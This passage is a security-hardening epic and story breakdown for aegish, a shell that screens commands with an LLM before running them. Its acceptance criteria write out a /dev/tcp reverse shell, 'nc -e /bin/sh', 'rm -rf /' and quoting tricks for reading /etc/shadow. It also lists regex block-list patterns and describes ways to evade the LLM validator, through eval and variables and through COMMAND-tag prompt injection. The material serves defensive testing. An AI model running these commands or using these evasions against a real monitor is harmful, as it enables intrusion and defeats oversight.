---
stepsCompleted: [1, 2, 3, 4]
inputDocuments:
  - docs/prd.md
  - docs/architecture.md
  - docs/analysis/v2/consolidated-security-report.md
  - docs/blog-post.md
  - docs/stories/rt001-ast-recursive-validation.md
  - docs/landlock-dropper-implementation.md
  - docs/shell-state-persistence.md
  - docs/stories/6-3-allowlist-environment-sanitization.md
  - docs/stories/cv22-source-dot-script-inspection.md
  - docs/stories/7-2-detect-variable-in-command-position-via-bashlex.md
---

# aegish — Epic Breakdown v3 (Security Hardening)

## Overview

This document provides the epic and story breakdown for aegish security hardening and feature enhancements, building on the existing Epics 1–9 (see `docs/epics.md`). These epics address vulnerabilities identified in the consolidated security report, implement production infrastructure improvements, and add new capabilities.

## Requirements Inventory

### Functional Requirements

FR36: Variable-in-command-position detection action is configurable (default: BLOCK)
FR37: Default production models match benchmark-recommended models (Gemini Flash primary, GPT-5-mini fallback)
FR38: Health check timeout triggers automatic fallback to secondary model
FR39: Meta-execution builtins (eval, source, .) with variable arguments are detected and warned
FR40: AST walker traverses control-flow nodes (for, if, while, until, function)
FR41: Compound commands are recursively decomposed and each subcommand validated independently
FR42: Static regex blocklist catches known-dangerous patterns before LLM validation
FR43: LLM validation queries have a configurable timeout
FR44: Client-side rate limiting prevents denial-of-wallet attacks on LLM API
FR45: JSON response parser handles markdown-wrapped LLM output
FR46: User commands are delimited to prevent COMMAND tag injection in LLM prompts
FR47: Source/dot commands trigger script content inspection before LLM validation
FR48: Security-critical configuration values cannot be overridden via environment variables in production mode
FR49: Invalid AEGISH_MODE value prevents aegish from starting
FR50: Role-based trust level configuration adjusts validation rules (e.g., sysadmin may run sudo)
FR51: Empty model names are rejected during validation
FR52: Login shell mode prints warning at startup and clear error when health check fails
FR53: Environment sanitization uses an allowlist instead of blocklist
FR54: Sensitive variable filter covers all credential-bearing env var patterns without false positives
FR55: envsubst is invoked via absolute path or resolved at startup
FR56: Runner binary path is validated against a hardcoded expected path
FR57: Shell state (cwd, exported env vars, exit code) persists across commands
FR58: Landlock dropper prevents runner binary from being executed as interactive shell
FR59: DENIED_SHELLS list includes all common shell binaries
FR60: ctypes syscall() uses correct c_long return type
FR61: All validation decisions are logged to a persistent structured audit trail
FR62: litellm dependency has a version ceiling to prevent untested upgrades
FR63: Benchmark-only dependencies are not in runtime dependencies
FR64: Benchmark metadata counts are computed dynamically from actual datasets
FR65: .gitignore and .env.example reflect current project structure and providers

### Non-Functional Requirements

NFR8: Static pre-LLM checks provide a deterministic safety floor independent of LLM availability
NFR9: Audit log entries use structured JSON format with timestamp, command hash, action, confidence, model
NFR10: Rate limiting is configurable via AEGISH_MAX_QUERIES_PER_MINUTE (default: 30)
NFR11: LLM query timeout is configurable via AEGISH_LLM_TIMEOUT (default: 30 seconds)
NFR12: Role/trust level configuration is deny-by-default (unknown roles get strictest rules)

### Additional Requirements

- Security hardening based on consolidated security report (47 CVs across 6 assessment phases)
- All security fixes must include regression tests
- Production mode must enforce immutable security configuration
- Backward compatibility: development mode behavior unchanged unless explicitly noted
- AST recursive validation must fall back gracefully when bashlex cannot parse

### FR Coverage Map

| FR | Epic | Story |
|----|------|-------|
| FR36 | 10 | 10.1 |
| FR37 | 12 | 12.3 |
| FR38 | 11 | 11.2 |
| FR39 | 10 | 10.2 |
| FR40 | 10 | 10.3 |
| FR41 | 10 | 10.4 |
| FR42 | 10 | 10.5 |
| FR43 | 11 | 11.1 |
| FR44 | 11 | 11.3 |
| FR45 | 11 | 11.4 |
| FR46 | 11 | 11.5 |
| FR47 | 11 | 11.6 |
| FR48 | 12 | 12.1 |
| FR49 | 12 | 12.2 |
| FR50 | 12 | 12.4 |
| FR51 | 12 | 12.5 |
| FR52 | 12 | 12.6 |
| FR53 | 13 | 13.1 |
| FR54 | 13 | 13.2 |
| FR55 | 13 | 13.3 |
| FR56 | 13 | 13.4 |
| FR57 | 14 | 14.1 |
| FR58 | 14 | 14.2 |
| FR59 | 14 | 14.3 |
| FR60 | 14 | 14.4 |
| FR61 | 15 | 15.1 |
| FR62 | 15 | 15.2 |
| FR63 | 15 | 15.3 |
| FR64 | 15 | 15.4 |
| FR65 | 15 | 15.5 |

## Epic List

- **Epic 10:** Strengthen Static Pre-LLM Validation
- **Epic 11:** Harden LLM Validation Pipeline
- **Epic 12:** Configuration Hardening & Trust Levels
- **Epic 13:** Environment & Subprocess Security
- **Epic 14:** Production Infrastructure & Shell State
- **Epic 15:** Audit Trail & Project Hygiene

---

## Epic 10: Strengthen Static Pre-LLM Validation

**Goal:** Add deterministic checks that catch dangerous patterns before reaching the LLM, closing gaps in the AST walker and adding new detection capabilities. These checks provide a safety floor that works even if the LLM is unavailable or returns incorrect results.

### Story 10.1: Make Variable-in-Command-Position Action Configurable (Default: BLOCK)

**Modifies:** Story 7.2 (completed)
**Addresses:** CV-16 (WARN architecturally equivalent to ALLOW)

As a **security administrator**,
I want **the variable-in-command-position detection to default to BLOCK instead of WARN, with the action configurable**,
So that **this evasion technique is blocked by default while allowing operators to relax it where needed**.

**Acceptance Criteria:**

**Given** a command like `a=bash; $a` triggers the variable-in-command-position check
**When** `AEGISH_VAR_CMD_ACTION` is not set
**Then** the command is BLOCKed (not warned)
**And** the reason message explains the detection

**Given** a command like `a=bash; $a` triggers the check
**When** `AEGISH_VAR_CMD_ACTION=warn` is set
**Then** the command produces a WARN (user can override)

**Given** an invalid value for `AEGISH_VAR_CMD_ACTION` (e.g., `allow`)
**When** aegish processes a command
**Then** the default BLOCK behavior is used
**And** a warning is logged about the invalid configuration value

**Tasks:**
- [ ] Add `AEGISH_VAR_CMD_ACTION` config with default `block`, valid values: `block`, `warn`
- [ ] Update `_find_var_in_command_position()` in `validator.py` to read config and return the configured action
- [ ] Update tests in `test_validator.py` to cover both BLOCK (default) and WARN modes
- [ ] Update story 7.2 documentation to reflect new default

**Files:** `src/aegish/validator.py`, `src/aegish/config.py`, `tests/test_validator.py`

---

### Story 10.2: Detect Meta-Execution Builtins with Variable Arguments

**Addresses:** Vulnerability in `_find_var_in_command_position` — eval/source/. bypass

As a **security engineer**,
I want **`eval`, `source`, and `.` commands with variable expansion in their arguments to be detected and blocked by default**,
So that **attackers cannot bypass validation by placing dangerous variable content in argument position to meta-execution builtins**.

**Acceptance Criteria:**

**Given** `a=bash; eval '$a'`
**When** the static validator processes the command and `AEGISH_VAR_CMD_ACTION` is not set (default)
**Then** a BLOCK is returned with reason "Variable expansion in arguments to 'eval' with preceding assignment"

**Given** `cmd='rm -rf /'; eval $cmd`
**When** the static validator processes the command
**Then** a BLOCK is returned (default) or WARN if `AEGISH_VAR_CMD_ACTION=warn`

**Given** `f=/tmp/x.sh; source $f`
**When** the static validator processes the command
**Then** a BLOCK is returned (default) or WARN if `AEGISH_VAR_CMD_ACTION=warn`

**Given** `f=/tmp/x.sh; . $f`
**When** the static validator processes the command
**Then** a BLOCK is returned (default) or WARN if `AEGISH_VAR_CMD_ACTION=warn`

**Given** `eval 'echo hello'` (no preceding assignment)
**When** the static validator processes the command
**Then** no action is returned (proceeds to LLM)

**Given** `eval echo hello` (no variable in args)
**When** the static validator processes the command
**Then** no action is returned (proceeds to LLM)

**Given** `a=foo; echo $a` (echo is not a meta-exec builtin)
**When** the static validator processes the command
**Then** no action is returned (proceeds to LLM)

**Given** `echo hello | a=x; eval '$a'` (pipeline variant)
**When** the static validator processes the command
**Then** a BLOCK is returned (default) or WARN if `AEGISH_VAR_CMD_ACTION=warn`

**Tasks:**
- [ ] Add `_META_EXEC_BUILTINS = {"eval", "source", "."}` constant in `validator.py`
- [ ] In `_find_var_in_command_position`, add check in both command and pipeline branches: if first_word is literal AND in `_META_EXEC_BUILTINS` AND `has_assignment` AND any `parts[1:]` have parameter expansion → return the configured action (BLOCK default, WARN if configured)
- [ ] Reuse `AEGISH_VAR_CMD_ACTION` from Story 10.1 (consistent behavior for all static variable checks)
- [ ] Add all 8 test cases from the specification

**Files:** `src/aegish/validator.py`, `tests/test_validator.py`

---

### Story 10.3: Traverse Control-Flow Nodes in AST Walker

**Addresses:** CV-47 (AST Walker Does Not Traverse Control-Flow Nodes)

As a **security engineer**,
I want **the AST walker to recurse into for, if, while, until, and function body nodes**,
So that **variable-in-command-position patterns inside control flow constructs are detected**.

**Acceptance Criteria:**

**Given** `if true; then $CMD; fi` with a preceding assignment
**When** the static validator processes the command
**Then** the variable-in-command-position check detects it

**Given** `for i in bash; do $i; done` with preceding context
**When** the static validator processes the command
**Then** the check detects the variable in command position inside the loop body

**Given** `f() { $CMD; }; f` with a preceding assignment
**When** the static validator processes the command
**Then** the check detects the variable in the function body

**Given** `true && $CMD` with a preceding assignment
**When** the static validator processes the command
**Then** the check detects the variable after `&&`

**Given** `while true; do echo safe; done` (no variable in command position)
**When** the static validator processes the command
**Then** no warning is returned

**Tasks:**
- [ ] Add handling for `for`, `if`, `while`, `until` node kinds by recursing into their `list` / `parts` children in `_find_var_in_command_position`
- [ ] Add handling for `function` node kind
- [ ] Add a generic recursive fallback for unknown node kinds (recurse into `parts` if present)
- [ ] Add test cases for each control-flow construct
- [ ] Verify that the `has_assignment` check remains correct with control-flow context

**Files:** `src/aegish/validator.py`, `tests/test_validator.py`

---

### Story 10.4: Validate Resolved Output of Command Substitutions Before Execution

**Addresses:** RT-001 (Semantic Gap Between LLM Validation and Bash Execution)
**Depends on:** Existing story `docs/stories/rt001-ast-recursive-validation.md`

As a **security engineer**,
I want **command substitutions in execution position to have their output validated before the outer command executes**,
So that **an attacker cannot hide a dangerous command inside a file or pipeline output and execute it via `$(...)` or backticks**.

**Core concept:** When a command like `$(cat a)` appears in execution position, `cat a` itself is harmless — but its output becomes the command that bash actually runs. The validator must execute the inner command, capture its output, and validate that output as a command before allowing the full command to proceed.

**Acceptance Criteria:**

**Given** `$(cat a)` where file `a` contains `rm -rf /`
**When** the validator processes the command
**Then** it detects a command substitution in execution position
**And** validates the inner command `cat a` via LLM — it is ALLOWed
**And** safely executes `cat a` to capture its output (`rm -rf /`)
**And** validates the output `rm -rf /` as a command — it is BLOCKed
**And** the entire command is blocked before execution

**Given** `$(cat deploy_script.sh)` where the file contains safe commands
**When** the validator processes the command
**Then** the inner command is executed, its output is validated, and the command proceeds

**Given** `ls; cat /etc/shadow` (compound command, no command substitution)
**When** the validator processes the command
**Then** it decomposes into `ls` and `cat /etc/shadow`, validates each independently via LLM
**And** `cat /etc/shadow` triggers BLOCK and the whole command is blocked

**Given** `echo $(whoami)` (command substitution NOT in execution position — it's an argument to `echo`)
**When** the validator processes the command
**Then** no special resolution is needed — the full command is validated as-is by the LLM

**Given** `ls -la` (single command, no decomposition needed)
**When** the validator processes the command
**Then** decomposition is bypassed for efficiency

**Given** a command that bashlex cannot parse (e.g., complex heredoc)
**When** the validator processes the command
**Then** it falls back to single-pass LLM validation

**Given** decomposition finds one BLOCK subcommand or resolved output
**When** aggregating results
**Then** early-exit stops validating remaining subcommands

**Tasks:**
- [ ] Parse commands via bashlex AST to detect command substitutions (`$()`, backticks) in execution position (command position, not argument position)
- [ ] For command substitutions in execution position: validate the inner command via LLM first; if ALLOWed, execute it in the sandbox to capture its output; validate the output as a command before allowing the outer command
- [ ] For compound commands (`; && || |`): decompose and validate each subcommand independently via LLM
- [ ] Use most-restrictive-wins aggregation logic (any BLOCK → whole command blocked)
- [ ] Implement early-exit on BLOCK
- [ ] Inner command execution must use the existing sandbox and environment (same `_build_safe_env()`, same Landlock restrictions)
- [ ] Add bashlex parse failure fallback to single-pass LLM validation
- [ ] Add comprehensive tests for: resolved dangerous output, safe output, argument-position substitutions (no resolution needed), compound commands, parse failures

**Files:** `src/aegish/validator.py`, `src/aegish/executor.py`, `src/aegish/llm_client.py`, `tests/test_validator.py`

---

### Story 10.5: Add Static Regex Blocklist for Known-Dangerous Patterns

**Addresses:** CV-12 (Single-Layer Defense — LLM is the Only Security Gate)

As a **security engineer**,
I want **a deterministic regex blocklist that catches well-known dangerous patterns before LLM validation**,
So that **reverse shells, destructive commands, and /dev/tcp patterns are blocked even if the LLM fails or is unavailable**.

**Acceptance Criteria:**

**Given** a command containing a reverse shell pattern (e.g., `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`)
**When** the static validator processes it
**Then** it is BLOCKed immediately without LLM validation
**And** the reason references the matched pattern

**Given** `rm -rf /` or `rm -rf /*`
**When** the static validator processes it
**Then** it is BLOCKed immediately

**Given** a command with `nc -e /bin/sh` or `ncat -e`
**When** the static validator processes it
**Then** it is BLOCKed immediately

**Given** `ls -la /tmp` (no match against any blocklist pattern)
**When** the static validator processes it
**Then** the blocklist passes and the command proceeds to LLM validation

**Given** a new regex blocklist entry needs to be added
**When** an operator updates the blocklist
**Then** it is a simple constant addition, not a code change

**Tasks:**
- [ ] Add `_STATIC_BLOCK_PATTERNS` list of compiled regexes in `validator.py`
- [ ] Include patterns for: reverse shells (`/dev/tcp/`, `nc -e`, `ncat -e`), destructive ops (`rm -rf /`, `mkfs`), fork bombs (`:(){`), data exfiltration (`/dev/tcp/` with redirects)
- [ ] Add `_check_static_blocklist()` function that returns BLOCK on match or None
- [ ] Call `_check_static_blocklist()` before LLM validation in `validate_command()`
- [ ] Keep the implementation simple — flat list of patterns, no complex framework
- [ ] Add tests for each pattern and for non-matching commands

**Files:** `src/aegish/validator.py`, `tests/test_validator.py`

---

## Epic 11: Harden LLM Validation Pipeline

**Goal:** Make the LLM validation layer more robust, resilient, and secure by adding timeouts, rate limiting, better parsing, and prompt injection prevention.

### Story 11.1: Add Timeout on Production LLM Validation Queries

**Addresses:** CV-06 (No Timeout on Production LLM Validation Queries)

As a **shell user**,
I want **LLM validation queries to have a configurable timeout**,
So that **a slow or unresponsive API does not block every command indefinitely**.

**Acceptance Criteria:**

**Given** the LLM API does not respond within the timeout period
**When** a command is being validated
**Then** the query is cancelled after `AEGISH_LLM_TIMEOUT` seconds (default: 30)
**And** the fallback model is tried (if configured)

**Given** `AEGISH_LLM_TIMEOUT=10` is set
**When** a validation query takes 15 seconds
**Then** the query is cancelled at 10 seconds

**Given** the primary model times out
**When** the fallback chain is active
**Then** the next model in the chain is tried with the same timeout

**Tasks:**
- [ ] Add `timeout` parameter to `completion()` call in `_try_model()` in `llm_client.py`
- [ ] Add `AEGISH_LLM_TIMEOUT` config (default: 30, integer seconds)
- [ ] Ensure timeout exception triggers fallback to next model
- [ ] Add test for timeout behavior with mock

**Files:** `src/aegish/llm_client.py`, `src/aegish/config.py`, `tests/test_llm_client.py`

---

### Story 11.2: Health Check Fallback to Secondary Model on Timeout

As a **shell user**,
I want **the health check to fall back to the secondary model if the primary model times out**,
So that **a slow primary model does not cause every command to be slow or fail**.

**Acceptance Criteria:**

**Given** the primary model times out during the startup health check
**When** fallback models are configured (e.g., `gpt-5-mini,claude-haiku-4-5`)
**Then** each fallback model is tried in order until one responds within the timeout
**And** the first responsive model becomes the active model for the session
**And** a warning is displayed: "Primary model timed out, using fallback: {model}"

**Given** the primary model AND all fallback models time out during health check
**When** no model responds
**Then** aegish starts with a warning about degraded validation and operates in the configured fail mode

**Given** the primary model times out but the third model in the chain responds
**When** the health check completes
**Then** the third model is used as the active model for the session
**And** the warning identifies which model is active

**Given** the primary model responds within the timeout during health check
**When** aegish starts
**Then** the primary model is used normally (no change)

**Tasks:**
- [ ] Modify health check in startup to apply timeout from `AEGISH_LLM_TIMEOUT`
- [ ] On primary timeout, iterate through the full fallback chain in order (not just the secondary)
- [ ] Store the first responsive model as the active model for the session
- [ ] Display clear warning banner identifying which model is active when not the primary
- [ ] Add tests for: primary ok, primary fails + secondary ok, primary + secondary fail + third ok, all fail

**Files:** `src/aegish/llm_client.py`, `src/aegish/shell.py`, `tests/test_llm_client.py`

---

### Story 11.3: Client-Side Rate Limiting on LLM Queries

**Addresses:** CV-17 (No Rate Limiting on LLM Queries)

As a **system administrator**,
I want **client-side rate limiting on LLM API queries**,
So that **rapid-fire commands cannot exhaust API quotas or incur runaway costs**.

**Acceptance Criteria:**

**Given** a user submits commands faster than the rate limit
**When** the rate limit is exceeded
**Then** subsequent commands are delayed (not rejected) until a token is available
**And** the user sees a message: "Rate limit reached, waiting..."

**Given** `AEGISH_MAX_QUERIES_PER_MINUTE=60` is set
**When** 60 commands have been validated in the last minute
**Then** the 61st command waits for a token

**Given** `AEGISH_MAX_QUERIES_PER_MINUTE` is not set
**When** aegish operates normally
**Then** a default rate of 30 queries/minute is enforced

**Tasks:**
- [ ] Implement token bucket rate limiter in `llm_client.py`
- [ ] Add `AEGISH_MAX_QUERIES_PER_MINUTE` config (default: 30)
- [ ] Rate limiter delays rather than rejects (blocking wait with message)
- [ ] Static pre-LLM checks (blocklist, variable checks) are not rate-limited
- [ ] Add tests for rate limiting behavior

**Files:** `src/aegish/llm_client.py`, `src/aegish/config.py`, `tests/test_llm_client.py`

---

### Story 11.4: Port Balanced JSON Parser to Production

**Addresses:** CV-30 (JSON Response Parsing Rejects Markdown-Wrapped Output)

As a **developer**,
I want **the production JSON response parser to handle markdown-wrapped LLM output**,
So that **models that wrap JSON in code fences don't trigger parse failures and fallback**.

**Acceptance Criteria:**

**Given** the LLM returns `\`\`\`json\n{"action":"allow","reason":"safe","confidence":0.9}\n\`\`\``
**When** the response is parsed
**Then** the JSON is correctly extracted and parsed

**Given** the LLM returns raw JSON `{"action":"allow","reason":"safe","confidence":0.9}`
**When** the response is parsed
**Then** it is parsed normally (no regression)

**Given** the LLM returns double-braced JSON `{{"action":"allow"}}`
**When** the response is parsed
**Then** the parser normalizes and extracts the JSON correctly

**Tasks:**
- [ ] Import `_find_balanced_json` from `benchmark/scorers/security_scorer.py` into production code — do NOT duplicate the function; either move it to a shared utility module or import from benchmark
- [ ] Update `_parse_response()` in `llm_client.py` to use `_find_balanced_json` as the primary parser
- [ ] Add tests for markdown-wrapped, raw, and double-braced JSON

**Files:** `src/aegish/llm_client.py`, shared utility location, `tests/test_llm_client.py`

---

### Story 11.5: Prevent COMMAND Tag Injection in LLM Prompt

**Addresses:** CV-07 (COMMAND Tag Injection in LLM Prompt)

As a **security engineer**,
I want **user commands to be properly delimited so COMMAND tag injection cannot manipulate the LLM prompt**,
So that **attackers cannot inject closing tags to escape the command context and add arbitrary instructions**.

**Acceptance Criteria:**

**Given** a command containing `</COMMAND>` text
**When** it is inserted into the LLM prompt
**Then** the closing tag is escaped (e.g., `&lt;/COMMAND&gt;` or replaced with a safe alternative)

**Given** a command containing nested XML-like tags
**When** it is inserted into the LLM prompt
**Then** the tags do not break the prompt structure

**Given** a normal command with no special characters
**When** it is inserted into the LLM prompt
**Then** the command is passed through unchanged

**Tasks:**
- [ ] Add escaping for `</COMMAND>` (and `<COMMAND>`) in the command string before prompt insertion in `llm_client.py`
- [ ] Use simple string replacement (e.g., replace `</COMMAND>` with `<\\/COMMAND>`)
- [ ] Add test cases for tag injection attempts

**Files:** `src/aegish/llm_client.py`, `tests/test_llm_client.py`

---

### Story 11.6: Read and Validate Source/Dot Script Contents

**Addresses:** CV-22 (Source/Dot Commands Execute Uninspected Scripts)
**Depends on:** `docs/stories/cv22-source-dot-script-inspection.md`

As a **security engineer**,
I want **`source` and `.` commands to include the script file contents in the LLM validation prompt**,
So that **the LLM can evaluate what will actually be executed, not just the source command string**.

**Acceptance Criteria:**

**Given** `source deploy.sh` where `deploy.sh` contains `rm -rf /`
**When** the LLM validates the command
**Then** the LLM sees both the command and the script contents
**And** can block based on the script's dangerous content

**Given** `source /etc/shadow` (sensitive path)
**When** the script reader processes the command
**Then** the sensitive path is blocked and contents are NOT sent to the LLM

**Given** `source bigscript.sh` where the script exceeds 8192 bytes
**When** the script reader processes the command
**Then** a size-limit note is included instead of full contents

**Given** `source missing.sh` where the file does not exist
**When** the script reader processes the command
**Then** a "not found" note is included and the LLM can still judge the command string

**Given** `source ~/./scripts/../scripts/evil.sh` (obfuscated path that resolves to a real script)
**When** the script reader processes the command
**Then** the path is resolved via `realpath()` before reading
**And** the resolved script contents are sent to the LLM for validation

**Given** `source $HOME/scripts/evil.sh` (path with env var expansion)
**When** the script reader processes the command
**Then** the env var is expanded, the path is resolved, and the script contents are validated

**Given** `. /tmp/innocent_name.sh` where the file is a symlink to `/etc/shadow`
**When** the script reader processes the command
**Then** the symlink is resolved via `realpath()` before the sensitivity check
**And** the sensitive target path is blocked (contents NOT sent to LLM)

**Given** `source "/etc/sha"dow"` (bash quoting trick — shell concatenates to `/etc/shadow`)
**When** the script reader processes the command
**Then** bash quotes are stripped before path resolution
**And** the resolved path `/etc/shadow` is caught by the sensitivity check and blocked

**Given** `source '/etc/shad'ow` or `source /etc/shad\ow` (single-quote and backslash-escape variants)
**When** the script reader processes the command
**Then** all bash quoting forms are normalized before path resolution

**Tasks:**
- [ ] Implement per CV-22 spec: add `_read_source_script()` in `llm_client.py`
- [ ] Add constants: `MAX_SOURCE_SCRIPT_SIZE`, `_SOURCE_DOT_RE`, `_SENSITIVE_READ_PATHS`, `_SENSITIVE_READ_GLOBS`
- [ ] Modify `_get_messages_for_model()` to include script contents in prompt
- [ ] Strip bash quoting from extracted path before resolution — handle double quotes, single quotes, and backslash escapes (e.g., `"/etc/sha"dow"` → `/etc/shadow`)
- [ ] Resolve symlinks AND normalize path (`realpath()`) before sensitivity check — obfuscated paths like `~/./scripts/../scripts/evil.sh` must resolve correctly
- [ ] Expand env vars in path (`os.path.expandvars()`) before resolution
- [ ] Add tests for: normal script, sensitive paths, large scripts, missing files, obfuscated paths (relative, `..`, `~/./`), symlinks to sensitive files, env var paths, bash quoting tricks (double-quote splitting, single-quote splitting, backslash escapes)

**Files:** `src/aegish/llm_client.py`, `tests/test_llm_client.py`

---

## Epic 12: Configuration Hardening & Trust Levels

**Goal:** Prevent configuration-based attacks, enforce validation of all configuration values, add role-based access control, and update defaults to benchmark-recommended models.

### Story 12.1: Protect Security Configuration from Environment Variable Mutation

**Addresses:** CV-03 (All Security Configuration Mutable via Environment Variables)

As a **security administrator**,
I want **security-critical configuration to come from a root-owned config file in production mode, ignoring environment variables**,
So that **the monitored user cannot weaken aegish's security posture by setting env vars before or during a session (e.g., `ssh user@host AEGISH_FAIL_MODE=open`)**.

**Threat model:** In production mode, aegish is the login shell. The user IS the adversary. They control their own environment — via `.profile`, `.bashrc`, SSH `SendEnv`, or direct `env VAR=val command` invocation. Reading security config from env vars in this context means the adversary controls the security policy.

**Acceptance Criteria:**

**Given** aegish is running in production mode
**When** security-critical settings are loaded (`AEGISH_FAIL_MODE`, `AEGISH_ALLOWED_PROVIDERS`, `AEGISH_RUNNER_PATH`, `AEGISH_MODE`, `AEGISH_ROLE`, `AEGISH_VAR_CMD_ACTION`)
**Then** these values are read exclusively from `/etc/aegish/config` (root-owned, mode 0644)
**And** environment variables for these settings are completely ignored

**Given** `/etc/aegish/config` does not exist in production mode
**When** aegish starts
**Then** hardcoded secure defaults are used (fail-safe, default providers, default runner path)
**And** a warning is logged that no config file was found

**Given** `/etc/aegish/config` is writable by non-root users
**When** aegish starts in production mode
**Then** it refuses to start with error: "Config file /etc/aegish/config must be owned by root and not writable by others"

**Given** aegish is running in development mode
**When** any configuration variable is set via environment
**Then** existing behavior is preserved (env vars work as before, backward compatible)

**Given** a user runs `ssh user@host AEGISH_FAIL_MODE=open`
**When** aegish starts in production mode on that session
**Then** `AEGISH_FAIL_MODE` from the environment is ignored; the value from `/etc/aegish/config` (or the secure default `safe`) is used

**Tasks:**
- [ ] Create config file parser for `/etc/aegish/config` (simple `KEY=VALUE` format, comments with `#`)
- [ ] In production mode: read security-critical settings from config file only, ignore env vars for these keys
- [ ] In development mode: preserve current env var behavior (no change)
- [ ] Validate config file ownership and permissions at startup (root-owned, not world-writable)
- [ ] If config file missing in production: use hardcoded secure defaults with warning
- [ ] Non-security settings (API keys, model selection) can still come from env vars in both modes
- [ ] Add tests for: config file loading, permission validation, env var ignored in production, env var works in development

**Files:** `src/aegish/config.py`, `src/aegish/shell.py`, `tests/test_config.py`

---

### Story 12.2: Refuse to Start on Invalid AEGISH_MODE

**Addresses:** CV-27 (Silent Fallback to Development Mode on Invalid AEGISH_MODE)

As a **system administrator**,
I want **aegish to refuse to start if AEGISH_MODE has an invalid value**,
So that **a typo like `AEGISH_MODE=prodcution` does not silently disable sandboxing**.

**Acceptance Criteria:**

**Given** `AEGISH_MODE=prodcution` (typo)
**When** aegish starts
**Then** it prints an error: "Invalid AEGISH_MODE 'prodcution'. Valid values: production, development"
**And** exits with a non-zero exit code

**Given** `AEGISH_MODE=production`
**When** aegish starts
**Then** it starts normally in production mode

**Given** `AEGISH_MODE` is not set
**When** aegish starts
**Then** it defaults to development mode (existing behavior)

**Tasks:**
- [ ] Add validation in `get_mode()` in `config.py`
- [ ] If AEGISH_MODE is set but not in `{"production", "development"}`, print error and `sys.exit(1)`
- [ ] Only fail when AEGISH_MODE is explicitly set to an invalid value (unset = default)
- [ ] Add tests for valid, invalid, and unset values

**Files:** `src/aegish/config.py`, `tests/test_config.py`

---

### Story 12.3: Update Default Models to Benchmark-Recommended Models

As a **user**,
I want **the default models to be the benchmark-proven best performers**,
So that **aegish works optimally out of the box without manual model selection**.

**Acceptance Criteria:**

**Given** aegish is installed with default configuration
**When** `AEGISH_PRIMARY_MODEL` is not set
**Then** the primary model is `google/gemini-3-flash-preview` (best overall: 97.8% detection, $1.12/1k)

**Given** aegish is installed with default configuration
**When** `AEGISH_FALLBACK_MODELS` is not set
**Then** the fallback chain includes all 9 benchmarked models (excluding the primary) in rank order:
  1. `hf-inference-providers/trendmicro-ailab/Llama-Primus-Reasoning:featherless-ai`
  2. `openai/gpt-5-mini`
  3. `anthropic/claude-haiku-4-5-20251001`
  4. `anthropic/claude-sonnet-4-5-20250929`
  5. `openai/gpt-5.1`
  6. `anthropic/claude-opus-4-6`
  7. `openai/gpt-5-nano`
  8. `hf-inference-providers/fdtn-ai/Foundation-Sec-8B-Instruct:featherless-ai`

**Given** the user sets custom `AEGISH_PRIMARY_MODEL` and `AEGISH_FALLBACK_MODELS`
**When** aegish starts
**Then** user-specified models are used (no change to override behavior)

**Note:** The 2 models that failed the benchmark (Phi-4, Gemini Pro) are excluded from defaults. Ranking is by aegish Score (balanced accuracy).

**Tasks:**
- [ ] Update `DEFAULT_PRIMARY_MODEL` in `config.py` to `google/gemini-3-flash-preview`
- [ ] Update `DEFAULT_FALLBACK_MODELS` in `config.py` to the full 8-model fallback chain above
- [ ] Add `google`, `hf-inference-providers` to `DEFAULT_ALLOWED_PROVIDERS`
- [ ] Update documentation/README to reflect new defaults
- [ ] Update tests that reference old defaults

**Files:** `src/aegish/config.py`, `tests/test_config.py`, `tests/test_defaults.py`

---

### Story 12.4: Role-Based Trust Level Configuration

As a **system administrator**,
I want **a trust-level configuration that adjusts validation rules based on user role**,
So that **sysadmins can run `sudo` commands in production without false blocks, while untrusted users get strict validation**.

**Acceptance Criteria:**

**Given** `AEGISH_ROLE=sysadmin` is set
**When** a `sudo` command is submitted
**Then** the system prompt is adjusted to treat `sudo` as expected behavior for this role
**And** `sudo` commands are not automatically blocked

**Given** `AEGISH_ROLE` is not set (default)
**When** a `sudo` command is submitted
**Then** default validation applies (LLM decides based on the command)

**Given** `AEGISH_ROLE=restricted`
**When** any command is submitted
**Then** stricter validation rules apply (e.g., WARN threshold lowered)

**Given** `AEGISH_ROLE=invalidrole`
**When** aegish starts
**Then** it prints a warning and uses the default (most restrictive) role

**Tasks:**
- [ ] Add `AEGISH_ROLE` config with valid values: `default`, `sysadmin`, `restricted`
- [ ] Define role-specific prompt adjustments (append role context to system prompt)
- [ ] For `sysadmin`: add context that sudo is expected and should not be blocked on its own
- [ ] For `restricted`: add context for stricter evaluation
- [ ] Invalid roles fall back to `default` with a warning
- [ ] Add role to audit log entries
- [ ] Add tests for each role

**Files:** `src/aegish/config.py`, `src/aegish/llm_client.py`, `tests/test_config.py`, `tests/test_llm_client.py`

---

### Story 12.5: Reject Empty Model Names in Validation

**Addresses:** CV-42 (is_valid_model_string() Accepts Empty Model Name)

As a **developer**,
I want **model string validation to reject empty model names like `openai/`**,
So that **invalid model strings are caught at startup rather than causing runtime API errors**.

**Acceptance Criteria:**

**Given** `AEGISH_PRIMARY_MODEL=openai/`
**When** the model string is validated
**Then** it is rejected as invalid

**Given** `AEGISH_PRIMARY_MODEL=openai/gpt-4`
**When** the model string is validated
**Then** it is accepted as valid

**Tasks:**
- [ ] Update `is_valid_model_string()` in `config.py` to check for non-empty model name after the slash
- [ ] Add test for empty model name after slash

**Files:** `src/aegish/config.py`, `tests/test_config.py`

---

### Story 12.6: Login Shell Lockout Warning and Health Check Error Handling

**Addresses:** CV-04 (Login Shell Lockout When API Unreachable)

As a **user who has set aegish as login shell**,
I want **a clear warning at session startup about the lockout risk, and specific error messages when the health check fails**,
So that **I understand the risk and can diagnose connectivity issues quickly**.

**Acceptance Criteria:**

**Given** aegish is configured as a login shell (detected via login shell heuristics)
**When** a session starts
**Then** a warning is printed: "Warning: aegish is configured as login shell. If LLM API becomes unreachable, you may be unable to execute commands. Ensure fail-mode is configured appropriately."

**Given** aegish is configured as a login shell
**When** the health check fails due to API unreachable
**Then** a specific error message is printed: "Health check failed: LLM API unreachable. Running in fail-{mode} mode. Check your API keys and network connectivity."

**Given** aegish is NOT configured as a login shell
**When** a session starts
**Then** no login shell warning is printed

**Tasks:**
- [ ] Detect login shell context (check if aegish is in `/etc/shells` or `$SHELL` points to aegish)
- [ ] Print warning banner at startup if login shell detected
- [ ] Customize health check failure message for login shell context
- [ ] Add tests for login shell detection and messaging

**Files:** `src/aegish/shell.py`, `src/aegish/llm_client.py`, `tests/test_shell.py`

---

## Epic 13: Environment & Subprocess Security

